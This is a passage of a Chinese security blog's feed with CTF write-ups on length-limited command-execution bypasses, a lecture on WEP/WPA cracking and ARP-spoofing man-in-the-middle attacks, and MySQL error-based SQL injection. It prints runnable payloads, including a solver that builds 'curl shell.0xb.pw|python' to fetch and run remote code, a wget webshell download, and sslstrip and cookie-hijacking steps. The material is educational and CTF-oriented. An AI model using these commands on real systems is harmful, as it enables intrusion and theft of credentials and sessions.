class="line">http://13.115.136.15/sandbox/c36eb1c4372f5f8131542751d486cebd/bash%20-c%20/readflag%7C</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;源于hitcon中的题目ssrfme的wp,然后去搜了下这个漏洞,做个简单的记录吧。&lt;a href=&quot;https://lorexxar.cn/2017/11/10/hitcon2017-writeup/#sql-so-hard&quot; title=&quot;LoRexxar&amp;#39;s blog&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://lorexxar.cn/2017/11/10/hitcon2017-writeup/#sql-so-hard&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ctf命令执行与绕过</title>
    <link href="http://Err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/"/>
    <id>http://Err0rzz.github.io/2017/11/13/ctf命令执行与绕过/</id>
    <published>2017-11-13T07:09:33.000Z</published>
    <updated>2017-11-14T08:37:07.894Z</updated>
    
    <content type="html"><![CDATA[<p>(写完之后没保存又要重新再敲一遍，好气)源于lemon师傅，然后又参考了pupile师傅的文章，’偷’点干货来。</p><a id="more"></a><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><p><code>&lt;</code> 符号<br><img src="https://i.imgur.com/jOXjsER.png" alt=""></p><p><code>$IFS$9</code> 符号 <code>${IFS}</code> 符号<img src="https://i.imgur.com/y9IFbAA.png" alt=""><br>这里解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，加一个{}就固定了变量名，同理在后面加个$可以起到截断作用。<br><br></p><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><p><code>%0a</code> 符号<br>换行符<br><code>%0d</code> 符号<br>回车符<br><code>;</code> 符号<br>表示连续指令<br><code>&amp;</code> 符号<br>表示将前一个命令设置进入后台<br><code>|</code> 符号<br>管道符，将前一个命令的输出作为后一个命令的输入<br><code>&amp;&amp;</code> 符号<br>前一个命令执行成功才会执行下一条命令<br><code>||</code> 符号<br>前一个命令执行失败才会执行下一条命令<br><br></p><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><p><code>a=l;b=s;$a$b</code><img src="https://i.imgur.com/Yginx2n.png" alt=""></p><p><code>base64编码</code> <img src="https://i.imgur.com/9uxwewr.png" alt=""><br><br></p><h2 id="短命令执行"><a href="#短命令执行" class="headerlink" title="短命令执行"></a>短命令执行</h2><p>这个技巧一开始看到的是p神的七字命令执行，觉得好牛逼。然后最近hitcon的orange出了题五字和四字的，觉得在风中凌乱了…</p><p>大体上的想法就是通过重命名文件绕过，然后通过<strong>ls</strong>来将文件名写入到文件中，<br><img src="https://i.imgur.com/wHp5Kgq.png" alt=""><br>可以看到<code>&gt;</code>这个重定向符号可以来创建文件，其中文件名是<code>&gt;</code>后面跟的参数，然后创建出我们精心构造好的多个文件名，然后通过<code>ls</code>打印出来再重定向<code>&gt;</code>到一个木马文件中，就可以执行了。</p><h1 id="拼接方法"><a href="#拼接方法" class="headerlink" title="拼接方法"></a>拼接方法</h1><p>讲题目之前先介绍两种拼接方法：</p><ol><li>一个反斜杠<code>\</code>，这种方法是将一次输入分成多出输入，以<code>\</code>换下一次，以<code>p</code>结束。这种方法的话创建的文件名是按照我们的输入正常排列好的，所以我们不需要添加<code>-t</code>来重新排序，如下面的七字绕过实例。</li><li>两个反斜杠<code>\\</code>，这种方法是利用<code>\</code>来拼接字符串，其中前一个<code>\</code>是用来反义后一个<code>\</code>的。这种方法的话需要精心构造输入，利用倒叙来输入，然后<code>ls</code>的时候需要加<code>-t</code>参数来排列一下，如下图以及五字四字绕过，虽然报错了但是也执行成功了。<img src="https://i.imgur.com/P99EI8n.png" alt=""></li></ol><h1 id="七字绕过"><a href="#七字绕过" class="headerlink" title="七字绕过"></a>七字绕过</h1><p>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if(strlen($_GET[1])&lt;8)&#123;</div><div class="line">     echo shell_exec($_GET[1]);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p>很简单的代码，绕过长度限制就可以执行任意命令,利用代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1&gt;wget\</div><div class="line">&gt;域名.\</div><div class="line">&gt;com\</div><div class="line">&gt;-O\</div><div class="line">&gt;she\</div><div class="line">&gt;ll.p\</div><div class="line">&gt;p</div><div class="line">ls&gt;a</div><div class="line">sh a</div></pre></td></tr></table></figure></p><p>上面的代码其实是在目标服务器创建个文件名为a的文件，内容为’wget 域名.com -O shell.pp’<br><img src="https://i.imgur.com/bSr4T6P.png" alt=""><br>代码含义就是去执行我们自己的vps上的一个木马文件</p><p><strong>这里有一点特别值得注意的。这里注意.不能作为文件名的开头，因为linux下.是隐藏文件的开头，ls列不出来</strong></p><h1 id="五字绕过"><a href="#五字绕过" class="headerlink" title="五字绕过"></a>五字绕过</h1><p>源代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $sandbox = &apos;/www/sandbox/&apos; . md5(&quot;orange&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);</div><div class="line">    @mkdir($sandbox);</div><div class="line">    @chdir($sandbox);</div><div class="line">    if (isset($_GET[&apos;cmd&apos;]) &amp;&amp; strlen($_GET[&apos;cmd&apos;]) &lt;= 5) &#123;</div><div class="line">        @exec($_GET[&apos;cmd&apos;]);</div><div class="line">    &#125; else if (isset($_GET[&apos;reset&apos;])) &#123;</div><div class="line">        @exec(&apos;/bin/rm -rf &apos; . $sandbox);</div><div class="line">    &#125;</div><div class="line">    highlight_file(__FILE__);</div></pre></td></tr></table></figure></p><p>观察可得，每个用户的操作目录独立，而且可以执行长度小于等于5的命令，那么不用担心别人文件干扰。<br>唯一值得注意的是因为长度要小于5，所以我们无法执行<code>ls -t&gt;a</code><br>接下来看一下orange的官方wp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">from time import sleep</div><div class="line">from urllib import quote</div><div class="line">payload = [</div><div class="line">    # generate `ls -t&gt;g` file</div><div class="line">    &apos;&gt;ls\\&apos;, </div><div class="line">    &apos;ls&gt;_&apos;, </div><div class="line">    &apos;&gt;\ \\&apos;, </div><div class="line">    &apos;&gt;-t\\&apos;, </div><div class="line">    &apos;&gt;\&gt;g&apos;, </div><div class="line">    &apos;ls&gt;&gt;_&apos;, </div><div class="line">    # generate `curl orange.tw.tw&gt;python`</div><div class="line">    # curl shell.0xb.pw|python</div><div class="line">    &apos;&gt;on&apos;, </div><div class="line">    &apos;&gt;th\\&apos;, </div><div class="line">    &apos;&gt;py\\&apos;,</div><div class="line">    &apos;&gt;\|\\&apos;, </div><div class="line">    &apos;&gt;pw\\&apos;, </div><div class="line">    &apos;&gt;x.\\&apos;,</div><div class="line">    &apos;&gt;xx\\&apos;, </div><div class="line">    &apos;&gt;l.\\&apos;, </div><div class="line">    &apos;&gt;el\\&apos;, </div><div class="line">    &apos;&gt;sh\\&apos;, </div><div class="line">    &apos;&gt;\ \\&apos;, </div><div class="line">    &apos;&gt;rl\\&apos;, </div><div class="line">    &apos;&gt;cu\\&apos;, </div><div class="line">    # exec</div><div class="line">    &apos;sh _&apos;, </div><div class="line">    &apos;sh g&apos;, </div><div class="line">]</div><div class="line">r = requests.get(&apos;http://xxx/web1.php/?reset=1&apos;)</div><div class="line">for i in payload:</div><div class="line">    assert len(i) &lt;= 5 </div><div class="line">    r = requests.get(&apos;http://xxx/web1.php/?cmd=&apos; + quote(i) )</div><div class="line">    print i</div><div class="line">    sleep(0.2)</div></pre></td></tr></table></figure></p><p>注意看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;ls\\</div><div class="line">ls&gt;_</div><div class="line">&gt;\ \\</div><div class="line">&gt;-t\\</div><div class="line">&gt;\&gt;g</div><div class="line">ls&gt;&gt;_</div></pre></td></tr></table></figure></p><p>这几行代码，因为我们提到不能用<code>ls -t&gt;g</code>来排序，所以我们需要用合理的分割方式和预写入来控制写入文件的内容</p><h1 id="四字绕过"><a href="#四字绕过" class="headerlink" title="四字绕过"></a>四字绕过</h1><p>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $sandbox = &apos;/www/sandbox/&apos; . md5(&quot;orange&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);</div><div class="line">    @mkdir($sandbox);</div><div class="line">    @chdir($sandbox);</div><div class="line">    if (isset($_GET[&apos;cmd&apos;]) &amp;&amp; strlen($_GET[&apos;cmd&apos;]) &lt;= 4) &#123;</div><div class="line">        @exec($_GET[&apos;cmd&apos;]);</div><div class="line">    &#125; else if (isset($_GET[&apos;reset&apos;])) &#123;</div><div class="line">        @exec(&apos;/bin/rm -rf &apos; . $sandbox);</div><div class="line">    &#125;</div><div class="line">    highlight_file(__FILE__);</div></pre></td></tr></table></figure></p><p>这题就是大佬们自己嗨了…最大的问题还是<code>ls -t&gt;g</code>这个问题，所以如果我们构造成<code>ls -th&gt;g</code>，然后逆序分割：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">dir</div><div class="line">sl</div><div class="line">g\&gt;</div><div class="line">ht-</div></pre></td></tr></table></figure></p><p>然后逆序输出到文件<br><img src="https://i.imgur.com/ygcSZPK.png" alt=""></p><p>这里就可以看出为什么构造<code>ls -th&gt;g</code>，因为这个时候可以看到目录遍历的时候，<code>ht-</code>跑到了<code>g&gt;</code>后面(大佬就是会牛逼…)，这时候完美的构造出了我们需要的命令，后面命令基本不变。</p><p>后面如果有别的继续补充吧…</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;(写完之后没保存又要重新再敲一遍，好气)源于lemon师傅，然后又参考了pupile师傅的文章，’偷’点干货来。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>无线破解浅谈</title>
    <link href="http://Err0rzz.github.io/2017/11/09/%E6%97%A0%E7%BA%BF%E7%A0%B4%E8%A7%A3%E6%B5%85%E8%B0%88/"/>
    <id>http://Err0rzz.github.io/2017/11/09/无线破解浅谈/</id>
    <published>2017-11-09T08:07:34.000Z</published>
    <updated>2017-11-09T09:53:59.011Z</updated>
    
    <content type="html"><![CDATA[<p>有幸给学弟学妹们上了一次课，记录一下学习过程以及把ppt转化成blog吧。<br><a id="more"></a></p><h2 id="破解原理"><a href="#破解原理" class="headerlink" title="破解原理"></a>破解原理</h2><p>无线网络中信号不会定向的传给每个设备，就是说AP发射的信号每个网卡都能够接收到，但是在正常情况下只有是自己的数据包才会接受，但是如果我们改一下网卡的模式，就能够让它接收周围所有的无线数据包，所以，没有加密的无线是毫无安全性可言的，因为任何在范围内的设备都能获取到包的内容，如果使用加密的无线，即使获取到也只是加密后的数据。<br>然后现在连无线大致就是两种：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">（1）    客户端：我是自己人，要连接你</div><div class="line">服务端：好的，那你连吧|骗我呢，不准连</div><div class="line"></div><div class="line">（2）    客户端：我是自己人，要连接你</div><div class="line">服务端：我不信，自己人都有密码，你把密码发给我看看</div><div class="line">客户端：好吧，密码是12345678</div><div class="line">黑客：得到密码啦</div><div class="line">可能么？在认证时候是信息都是明文传输的，如果直接传密码都能够得到，其实是</div><div class="line">客户端：我是自己人，要连接你</div><div class="line">服务端：我不信，自己人都有密码，你用密码把45212345这个给我加密了</div><div class="line">客户端：好的，加密后的密文是453154312</div><div class="line">服务端：用密码解密后，还是45212345就允许连接，否则不允许</div></pre></td></tr></table></figure></p><p>然后现在的加密就是WEP，WPA，WPA2等等，下面分别介绍：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">WEP，它使用RC4加密，加密数据用的密码是“WiFi的密码+iv”，iv是随机生成的，对方不知道，所以需要通过明文发送，因为iv只有200多种，而加密用的iv可以直接读到，所以如果收到的大量的数据包就会有使用了重复iv的数据包（大于254就绝对会有重复的），那么用那两个加密的数据包去异或就会得到明文的异或。。。最终就能得到密码，所以WEP加密绝对能够被破解。</div><div class="line">WPA，就是针对WEP缺点的改进。使用了更加好的加密算法，iv的取值也变成很多，很难得到重复的，加密数据的密码是“WiFi密码+WiFi名字+其他”，他只能用暴力破解，而且不能跑彩虹表（因为这里面有WiFi名称这个元素），如果你确定目标永远不会改WiFi名称，其实也是可以自己根据名称生成彩虹表来跑的。它有两种，要么使用认证服务器（安全性高，企业用）要么使用预共享秘钥（安全性相对较低，家庭等使用），我们一般也是使用psk这种。</div><div class="line">WPA2，就是wpa的升级版，加密算法使用了更好的。</div><div class="line">WPS，应该是配合前面的加密吧。为了解决前面使用认证复杂而产生的。分两种验证方式，要么使用pin码，就是自己的客户端生成一个pin码，在路由器端输入这个pin码就可以完成认证，还有就是使用按钮，例如手机上点一下那个按钮，然后在路由器上也按一下，就能完成认证。不过它的pin码设计上有缺陷，只要尝试1万多次就能得到，然后通过pin能得到WiFi密码。</div></pre></td></tr></table></figure></p><p>现在来看看抓包的样子：<br>开启网卡的混杂模式（监听模式）后抓包<br><img src="https://i.imgur.com/Dx1VNlA.png" alt=""><br>看到抓到的包都是802.11协议的包，这是因为周围的无线都是加密的，我开了个没加密的，就可以看到协议变了，也能够看到内容了<br><img src="https://i.imgur.com/CljvPY5.png" alt=""><br>如果是wep，wpa/psk加密，如果有密码还可以直接使用它解包看内容</p><h2 id="WEP"><a href="#WEP" class="headerlink" title="WEP"></a>WEP</h2><p><strong>本实验需要外接一个无线网卡</strong></p><p>1.关闭网络管理以及可能会干扰airmon-ng工作的进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">service network-manager stop</div><div class="line">airmon-ng cherk kill</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/YFzCrJy.png" alt=""><br><br></p><p>2.查看要监听的无线网卡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">airmon-ng</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/NHqwPjW.png" alt=""><br>我们选择监听wlan0网卡<br><br></p><p>3.开始监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">airmon-ng start wlan0</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/jiWRn6R.png" alt=""><br><br></p><p>4.查看周围无线设备<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">airodump-ng wlan0mon</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/VuXjE52.png" alt=""><br>如果抓到了密钥流信息，第一个红色箭头会有信息显示<br><br></p><p>5.针对特定ap进行监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">airodump-ng wlan0mon --bssid AP_Mac  -c [AP_channel]  -w  [result_file]</div></pre></td></tr></table></figure></p><p><br></p><p>6.因为密钥信息会在连接刚开始验证的时候交换，所以对某个已经连接的客户端实施断开连接打击，直到抓到密钥流<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aireplay-ng -0 2 -a [AP_Mac] -c [Client_Mac] wlan0mon</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/yQik4SN.png" alt=""><br>-0表示deaulth攻击，可以把已经连接好的客户端断开，2表示攻击两次</p><p><img src="https://i.imgur.com/Nc206Od.png" alt=""><br>可以看到已经抓到了密钥流，此时会在目录下生成一个*.xor文件<br><img src="https://i.imgur.com/k3H3fXm.png" alt=""><br><br></p><p>7.通过密钥文件与ap建立关联关系<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aireplay-ng -1 60 -e [essid] -y wep*.xor -a [AP_Mac] -h [Wlan0mon_Mac] wlan0mon</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/RHS4dwt.png" alt=""><br>此处-h后面参数跟wlan0mon的mac前6串即可<br><img src="https://i.imgur.com/B23QADi.png" alt=""><br><br></p><p>8.通过arp重放，来抓到更多的信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aireplay-ng -3 -b [AP_mac] -h [wlan0mon-mac] wlan0mon</div></pre></td></tr></table></figure></p><p>可以发现监听窗口里<code>data</code>值越来越多(这个越多，破解速度越快，难度越低)<br><img src="https://i.imgur.com/0ELdVQV.png" alt=""><br><br></p><p>9.差不多了就可以开始破解了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aircrack-ng wep*.cap</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/UvDeoOo.png" alt=""></p><h2 id="WPA"><a href="#WPA" class="headerlink" title="WPA"></a>WPA</h2><p>目前WPA只能靠暴力跑字典来破解，但是效率又很低下。所以不一定能破解出来，虽说WPA2已经有了<strong>密钥重装攻击</strong>，但是感觉这个协议还是很安全的。<br>步骤与破解WEP差不多，只不过不需要第7,8两步，这里就不重复写了。</p><h2 id="钓鱼wifi"><a href="#钓鱼wifi" class="headerlink" title="钓鱼wifi"></a>钓鱼wifi</h2><h1 id="wifi-pumpkin"><a href="#wifi-pumpkin" class="headerlink" title="wifi-pumpkin"></a>wifi-pumpkin</h1><p>邪恶双子星，逼格很高的名字，通俗的说就是钓鱼WiFi。配置方法超级多，今天说下最简单的之一吧。装备就是要两张网卡，虚拟机可以虚拟一张，无线网卡需要自配。<br>安装方法，输入以下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1. git clone https://github.com/P0cL4bs/WiFi-Pumpkin.git</div><div class="line">2.cd WiFi-Pumpkin</div><div class="line">3.chmod +x installer.sh</div><div class="line">4../installer.sh –install</div></pre></td></tr></table></figure></p><p>安装好了之后在目录下运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./wifi-Pumpkin.py</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/LJxofow.png" alt=""><br>目前该工具还刚开始玩，有很多功能并不熟悉，只能结束一下最简单的功能，以后再继续补充。</p><p><img src="https://i.imgur.com/k0XnaCP.png" alt=""><br><code>setting</code>页面只需要简单配置一下ssid，信道的话随便填，之后就可以start了。</p><p>目前主要用的两个地方：<br>1.Driftnet功能<br><img src="https://i.imgur.com/ILxGvz3.png" alt=""><br>主要用来查看监听的流量中的图片</p><p>2.Activity-Monitor模块<br><img src="https://i.imgur.com/U2wCe9s.png" alt=""><br>主要用来查看监听流量的请求信息</p><h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p><strong>arp欺骗</strong>原理如下图：<br><img src="https://i.imgur.com/Pj9BubN.png" alt=""><br><img src="https://i.imgur.com/IyeArF8.png" alt=""></p><h1 id="内网断网攻击"><a href="#内网断网攻击" class="headerlink" title="内网断网攻击"></a>内网断网攻击</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">第一步：查找目标IP地址  fping -asg 192.168.1.0/24</div><div class="line">第二步：查看网关ip   route -n</div><div class="line">第三步：断网攻击：arpspoof -i 网卡 -t  受害者IP 网关IP</div></pre></td></tr></table></figure><p>主要是使用<code>arpsoof</code>工具实现欺骗和截断<br><br></p><h1 id="截取照片"><a href="#截取照片" class="headerlink" title="截取照片"></a>截取照片</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">第一步：开启IP流量转发    echo 1 &gt; /proc/sys/net/ipv4/ip_forward</div><div class="line">第二步：ARP欺骗： arpspoof  -i  网卡  网关IP  受害者IP</div><div class="line">第三步：抓取图片：driftnet  -i  网卡</div></pre></td></tr></table></figure><p>如果不开启ip流量转发，那么和断网攻击效果一样。用到的工具除了<code>arpspoof</code>，还有<code>driftnet</code>工具，主要用来抓取图片的，上面钓鱼wifi里有讲到这个工具<br><br></p><h1 id="截取https账号"><a href="#截取https账号" class="headerlink" title="截取https账号"></a>截取https账号</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">第一步：配置文件：vim /etc/ettercap/etter.conf   删除Linux最后两段前的#号</div><div class="line">第二步：过滤数据包：iptables -t nat -A PREROUTING -p tcp -i eth0 --destination-port 80 -j  REDIRECT --to-port 10000</div><div class="line">第三步：ARP欺骗：arpspoof  -i  网卡  网关ip  受害者ip </div><div class="line">第四步：扒皮：sslstrip -a -f -k 或 sslstrip -l 10000</div><div class="line">第五步：开始嗅探：ettercap  -Tq  -i  网卡</div></pre></td></tr></table></figure><p>主要用到了<code>sslstrip</code>工具用来脱<code>ssl层</code>,以及用<code>ettercap</code>工具来嗅探账号密码</p><h1 id="截取cookie"><a href="#截取cookie" class="headerlink" title="截取cookie"></a>截取cookie</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">第一步：开启IP转发：echo 1 &gt; /proc/sys/net/ipv4/ip_forward</div><div class="line">第二步：ARP欺骗： arpspoof  -i  网卡  网关IP  受害者IP</div><div class="line">第三步：抓包：wireshark  或者 tcpdump -i eth0 -w cookie.cap</div><div class="line">第四部：等待受害人登陆</div><div class="line">第五部：处理抓取的数据包：ferret -r cookie.cap</div><div class="line">第六步：开启hamster服务：hamster</div><div class="line">第七步：设置代理：127.0.0.1:1234</div></pre></td></tr></table></figure><p>主要其实还是找到对方的登陆cookie来替换自己的，从而获得权限</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有幸给学弟学妹们上了一次课，记录一下学习过程以及把ppt转化成blog吧。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>浅谈php安全</title>
    <link href="http://Err0rzz.github.io/2017/11/07/%E6%B5%85%E8%B0%88php%E5%AE%89%E5%85%A8/"/>
    <id>http://Err0rzz.github.io/2017/11/07/浅谈php安全/</id>
    <published>2017-11-07T09:07:53.000Z</published>
    <updated>2017-11-09T08:12:41.869Z</updated>
    
    <content type="html"><![CDATA[<p>最近在看p神的blog，觉得大佬就是大佬。今天看到这篇觉得有很多需要学习的地方，又不好意思偷，就只能直接贴链接了。<a href="http://www.freebuf.com/articles/web/38383.html" title="浅谈php安全" target="_blank" rel="external">http://www.freebuf.com/articles/web/38383.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近在看p神的blog，觉得大佬就是大佬。今天看到这篇觉得有很多需要学习的地方，又不好意思偷，就只能直接贴链接了。&lt;a href=&quot;http://www.freebuf.com/articles/web/38383.html&quot; title=&quot;浅谈php安全&quot; target=
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mysql显错注入</title>
    <link href="http://Err0rzz.github.io/2017/10/31/updatexml-mysql%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>http://Err0rzz.github.io/2017/10/31/updatexml-mysql显错注入/</id>
    <published>2017-10-31T06:51:09.000Z</published>
    <updated>2017-12-26T07:47:40.763Z</updated>
    
    <content type="html"><![CDATA[<p>整理一下那些报错注入的函数吧</p><a id="more"></a><p>报错注入的前提条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用，</div><div class="line">它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解</div></pre></td></tr></table></figure></p><h1 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h1><p>updatexml(xml_document,xpath_string,new_value);<br>第一个参数:xml_documnet是String格式，为XML文档对象的名称，文中为Doc。<br>第二个参数:xpath_string(xpath格式的字符串),如果不了解xpath语法,可以在网上查找教程。<br>第三个参数:new_value,string格式,替换查找到的符合条件的数据。</p><p>然后咋们再看看语句:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.XXXIII.com/a.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</div></pre></td></tr></table></figure></p><p><code>concat(str1,str2,...)</code><br>返回结果为连接参数产生的字符串。如有任何一个参数为null，则返回值为null。</p><p>通过查询@@version,返回版本。然后<code>concat</code>将其字符串化。因为<code>updatexml</code>第二个参数需要xpath格式的字符串,所以不符合要求，然后报错。</p><p>错误大概会是:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’</div></pre></td></tr></table></figure></p><p><br></p><h1 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h1><p>利用方式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">count(*)、rand()、group by三者缺一不可</div><div class="line">报错注入用一个公式，只要套用公式即可，公式如下:</div><div class="line">?id=2&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (爆错语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a</div><div class="line">)--+</div></pre></td></tr></table></figure></p><p>公式解析：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">floor()是取整数</div><div class="line">rand()在0和1之间产生一个随机数</div><div class="line">rand(0)*2将取0到2的随机数</div><div class="line">floor(rand()*2)有两条记录就会报错</div><div class="line">floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的</div><div class="line">count(*)是用来统计结果的，相当于刷新一次结果</div><div class="line">group by在对数据进行分组时会先看看虚拟表里有没有这个值，没有的话就插入存在的话count(*)加1</div><div class="line">在使用group by时floor(rand(0)*2)会被执行一次，若虚表不存在记录，插入虚表时会再执行一次</div></pre></td></tr></table></figure></p><p><br><br>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id = 1 and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/t4bx8Je.png" alt=""></p><h1 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id = 1 and (extractvalue(1, concat(0x5c,(select user()))))</div></pre></td></tr></table></figure><p><img src="https://i.imgur.com/N5CsyQo.png" alt=""><br><br></p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id =1 and 